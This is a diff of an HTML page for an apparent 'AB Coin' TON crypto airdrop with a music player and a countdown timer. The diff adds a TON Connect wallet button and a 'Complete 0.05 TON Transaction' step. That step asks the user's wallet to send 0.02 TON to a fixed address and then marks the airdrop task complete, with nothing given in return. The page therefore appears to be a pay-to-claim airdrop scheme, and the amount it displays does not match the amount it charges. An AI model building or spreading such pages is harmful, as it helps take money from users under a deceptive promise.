@@ -3,7 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Airdrop</title>
+  <title>TON Airdrop with Song Bar</title>
+  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
   <style>
     body {
       margin: 0;
@@ -14,15 +15,18 @@
       overflow: hidden;
     }
 
-    .container {
-      margin-top: 20px;
+    #ton-connect {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      z-index: 9999;
     }
 
     .coin-container {
       position: relative;
       width: 120px;
       height: 120px;
-      margin: 60px auto;
+      margin: 50px auto 10px;
     }
 
     .coin-image {
@@ -47,80 +51,95 @@
       filter: blur(10px);
     }
 
-    @keyframes glow-spin {
-      0% {
-        transform: rotate(0deg) scaleX(1.5);
-        box-shadow: 0 0 10px rgb(255, 0, 0);
-      }
-      50% {
-        transform: rotate(180deg) scaleX(1);
-        box-shadow: 0 0 15px rgb(0, 255, 0);
-      }
-      100% {
-        transform: rotate(360deg) scaleX(1.5);
-        box-shadow: 0 0 20px rgb(0, 0, 255);
-      }
-    }
-
-    .headline {
-      font-size: 28px;
-      font-weight: bold;
-      margin-top: 20px;
-      letter-spacing: 2px;
-      text-shadow: 2px 2px 5px rgba(255, 255, 0, 0.7);
-    }
-
-    .subheadline {
-      font-size: 20px;
-      margin: 10px auto;
-      line-height: 1.6;
-      color: #f0e68c;
-      text-shadow: 1px 1px 3px rgba(255, 255, 0, 0.5);
-    }
-
-    .target {
+    .airdrop-item {
       background: rgba(255, 255, 255, 0.1);
-      padding: 20px;
-      margin: 20px auto;
+      padding: 15px;
+      margin: 10px auto;
       border-radius: 10px;
       max-width: 80%;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .airdrop-logo {
+      width: 50px;
+      height: 50px;
+      background: url('coin.png') no-repeat center center / cover;
+      border-radius: 50%;
+      margin-right: 20px;
+    }
+
+    .airdrop-content {
+      flex-grow: 1;
+      text-align: left;
+    }
+
+    .airdrop-button {
+      padding: 10px 20px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .airdrop-button:hover {
+      background-color: #45a049;
+    }
+
+    .airdrop-button.disabled {
+      background-color: gray;
+      cursor: not-allowed;
+    }
+
+    .countdown {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin: 20px auto 10px;
+    }
+
+    .countdown-box {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 5px 10px;
+      border-radius: 5px;
+      text-align: center;
+      font-size: 14px;
+    }
+
+    .countdown-box span {
+      display: block;
+      font-size: 18px;
+      font-weight: bold;
     }
 
     .song-bar {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: 20px;
-      margin: 20px auto;
+      background: rgba(255, 255, 255, 0.1);
+      padding: 15px;
+      margin: 10px auto;
+      border-radius: 10px;
+      max-width: 90%;
     }
 
     .song-bar button {
-      background-color: #444;
-      border: none;
+      padding: 10px;
+      margin: 5px;
+      background-color: #1c1c1c;
       color: white;
-      padding: 15px 20px;
-      border-radius: 10px;
-      font-size: 18px;
+      border: none;
+      border-radius: 5px;
       cursor: pointer;
-      box-shadow: 0 3px 6px rgba(0, 0, 0, 0.7);
-      transition: all 0.3s ease;
+      transition: background-color 0.3s ease;
     }
 
     .song-bar button:hover {
-      background-color: #ff5722;
-      transform: scale(1.1);
-    }
-
-    .song-bar button#play-pause {
-      background-color: #ff5722;
-    }
-
-    .song-bar button#volume {
       background-color: #333;
     }
 
-    #volume-slider {
-      width: 200px;
+    audio {
+      width: 100%;
       margin-top: 10px;
     }
 
@@ -132,7 +151,6 @@
       justify-content: space-around;
       background-color: #1c1c1c;
       padding: 10px 0;
-      z-index: 1000;
     }
 
     .nav-bar button {
@@ -158,47 +176,57 @@
       background-image: url('leader.png');
     }
 
-    .nav-bar button.lucky {
-      background-image: url('lucky.png');
-    }
+   
 
     .nav-bar button.airdrop {
       background-image: url('airdrop.png');
     }
-
-    #ton-connect {
-    position: absolute;
-    top: 20px;   /* Distance from the top */
-    right: 20px; /* Distance from the right */
-    z-index: 9999; /* Ensures it's on top of other elements */
-}
   </style>
 </head>
 <body>
+  <!-- TON Connect Button -->
   <div id="ton-connect"></div>
-  <div class="container">
-    <div class="coin-container">
-      <div class="coin-image"></div>
-      <div class="glow-effect"></div>
+
+  <!-- Glowing Coin -->
+  <div class="coin-container">
+    <div class="coin-image"></div>
+    <div class="glow-effect"></div>
+  </div>
+
+  <!-- Airdrop Item 1 -->
+  <div class="airdrop-item">
+    <div class="airdrop-logo"></div>
+    <div class="airdrop-content">Complete 0.05 TON Transaction</div>
+    <button class="airdrop-button" id="airdrop-start">Start</button>
+  </div>
+
+  <!-- Countdown Timer -->
+  <div class="countdown">
+    <div class="countdown-box">
+      <span id="months">00</span>Mon
     </div>
-    <h1 class="headline">AB Coin Airdrop is Coming Soon</h1>
-    <div class="target">
-      <p class="subheadline">Target AB Coin Hold:Totel user  <span id="target-coin">100B</span> to Launch Airdrop.</p>
-      <p class="subheadline">Listening to Songs...</p>
-      <div class="song-bar">
-        <button id="prev-song">⏮️ Previous</button>
-        <button id="play-pause">▶️ Play</button>
-        <button id="next-song">⏭️ Next</button>
-      </div>
- <div id="ton-connect"></div>
-      <!-- Volume control slider -->
-      <div class="volume-control">
-        <label for="volume-slider">Volume:</label>
-        <input type="range" id="volume-slider" min="0" max="1" step="0.01" value="0.5">
-      </div>
+    <div class="countdown-box">
+      <span id="days">00</span>Day
+    </div>
+    <div class="countdown-box">
+      <span id="hours">00</span>Hr
+    </div>
+    <div class="countdown-box">
+      <span id="minutes">00</span>Min
+    </div>
+    <div class="countdown-box">
+      <span id="seconds">00</span>Sec
     </div>
   </div>
 
+  <!-- Song Bar -->
+  <div class="song-bar">
+    <button id="prev-song">Previous</button>
+    <button id="next-song">Next</button>
+    <audio id="audio-player" controls></audio>
+  </div>
+
+  <!-- Navigation Bar -->
   <div class="nav-bar">
     <button class="home" onclick="window.location.href='home.html'"></button>
     <button class="leader" onclick="window.location.href='leader.html'"></button>
@@ -206,77 +234,84 @@
     <button class="airdrop" onclick="window.location.href='airdrop.html'"></button>
   </div>
 
-
   <script>
-    const audioPlayer = new Audio();
-    const prevButton = document.getElementById('prev-song');
-    const playPauseButton = document.getElementById('play-pause');
-    const nextButton = document.getElementById('next-song');
-    const volumeSlider = document.getElementById('volume-slider');
-
-    const songs = Array.from({ length: 200 }, (_, i) => `${i + 1}.mp3`);
-    let currentSongIndex = 0;
-    let isPlaying = false;
-
-    // Volume control
-    volumeSlider.addEventListener('input', (e) => {
-      audioPlayer.volume = e.target.value;
+    // TON Connect UI Initialization
+    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+      manifestUrl: 'https://abu09127abu.github.io/Ab-coin-tast-/tonconnect-manifest.json',
+      buttonRootId: 'ton-connect'
     });
 
-    function playSong(index) {
-      audioPlayer.src = songs[index];
-      audioPlayer.play();
-      isPlaying = true;
-      playPauseButton.textContent = "⏸️ Pause";
-    }
+    // Countdown Timer
+    const countdown = () => {
+      const targetDate = new Date("January 26, 2025 00:00:00").getTime();
+      const now = new Date().getTime();
+      const difference = targetDate - now;
 
-    function pauseSong() {
-      audioPlayer.pause();
-      isPlaying = false;
-      playPauseButton.textContent = "▶️ Play";
-    }
+      if (difference < 0) return;
 
-    prevButton.addEventListener('click', () => {
-      currentSongIndex = (currentSongIndex - 1 + songs.length) % songs.length;
-      playSong(currentSongIndex);
-    });
+      const months = Math.floor(difference / (1000 * 60 * 60 * 24 * 30));
+      const days = Math.floor((difference % (1000 * 60 * 60 * 24 * 30)) / (1000 * 60 * 60 * 24));
+      const hours = Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+      const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
+      const seconds = Math.floor((difference % (1000 * 60)) / 1000);
 
-    nextButton.addEventListener('click', () => {
-      currentSongIndex = (currentSongIndex + 1) % songs.length;
-      playSong(currentSongIndex);
-    });
+      document.getElementById("months").textContent = months.toString().padStart(2, "0");
+      document.getElementById("days").textContent = days.toString().padStart(2, "0");
+      document.getElementById("hours").textContent = hours.toString().padStart(2, "0");
+      document.getElementById("minutes").textContent = minutes.toString().padStart(2, "0");
+      document.getElementById("seconds").textContent = seconds.toString().padStart(2, "0");
+    };
 
-    playPauseButton.addEventListener('click', () => {
-      if (isPlaying) {
-        pauseSong();
-      } else {
-        playSong(currentSongIndex);
+    setInterval(countdown, 1000);
+
+    // Transaction Completion
+    const startButton = document.getElementById("airdrop-start");
+    startButton.addEventListener("click", async () => {
+      try {
+        const transaction = {
+          messages: [
+            {
+              address: "UQDv1BTxlFAntDdfq9e7WHr6lgNBg_eoEnyXPuaA8wWhzabn",
+              amount: "20000000"
+            }
+          ]
+        };
+
+        await tonConnectUI.sendTransaction(transaction);
+        localStorage.setItem("transactionComplete", "true");
+        startButton.textContent = "Complete";
+        startButton.classList.add("disabled");
+      } catch (error) {
+        console.error("Transaction failed", error);
       }
     });
 
-    // Format numbers into K, M, B, T
-    function formatNumber(num) {
-      if (num >= 1e12) return (num / 1e12).toFixed(1) + 'T';
-      if (num >= 1e9) return (num / 1e9).toFixed(1) + 'B';
-      if (num >= 1e6) return (num / 1e6).toFixed(1) + 'M';
-      if (num >= 1e3) return (num / 1e3).toFixed(1) + 'K';
-      return num;
+    if (localStorage.getItem("transactionComplete") === "true") {
+      startButton.textContent = "Complete";
+      startButton.classList.add("disabled");
     }
 
-    document.getElementById('target-coin').textContent = formatNumber(100000000000);
-    
-    audioPlayer.addEventListener('ended', () => {
-  currentSongIndex = (currentSongIndex + 1) % songs.length;
-  playSong(currentSongIndex);
-});
+    // Song Bar Logic
+    const audioPlayer = document.getElementById("audio-player");
+    const songs = Array.from({ length: 100 }, (_, i) => `${i + 1}.mp3`);
+    let currentSongIndex = 0;
 
-</script>
-<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-<script>
-    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-        manifestUrl: 'https://abu09127abu.github.io/Ab-coin-tast-/tonconnect-manifest.json',
-        buttonRootId: 'ton-connect'
+    const updateSong = () => {
+      audioPlayer.src = songs[currentSongIndex];
+      audioPlayer.play();
+    };
+
+    document.getElementById("prev-song").addEventListener("click", () => {
+      currentSongIndex = (currentSongIndex - 1 + songs.length) % songs.length;
+      updateSong();
     });
-</script>
+
+    document.getElementById("next-song").addEventListener("click", () => {
+      currentSongIndex = (currentSongIndex + 1) % songs.length;
+      updateSong();
+    });
+
+    updateSong(); // Initialize the first song
+  </script>
 </body>
 </html>
